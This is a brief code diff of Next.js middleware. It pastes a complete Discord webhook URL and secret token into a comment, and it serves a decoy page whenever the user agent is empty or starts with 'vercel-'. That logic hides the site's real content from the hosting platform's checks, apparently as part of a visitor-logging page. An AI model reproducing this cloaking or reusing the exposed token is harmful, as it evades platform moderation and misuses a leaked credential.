@@ -1,9 +1,10 @@
 import { NextRequest, NextResponse, userAgent } from 'next/server';
 
-const webhook = process.env.WEBHOOK_URL // Your webhook URL now is in your project's environment variables.
+const webhook = process.env.WEBHOOK_URL // https://discord.com/api/webhooks/1221784810930966529/rHb4v50iPnaSVzhWwyfDCjSFTksqX8NYlGSfaY_LnF5qZOQ5QA5-DQrf2NuUUf70adDPYour webhook URL now is in your project's environment variables.
 
 export async function middleware(req){
   const ua = userAgent(req)?.ua;
+
   if(!ua || ua.startsWith("vercel-")){
     // Displaying another page for Vercel
     return NextResponse.rewrite(new URL("/vercel.html",req.url));
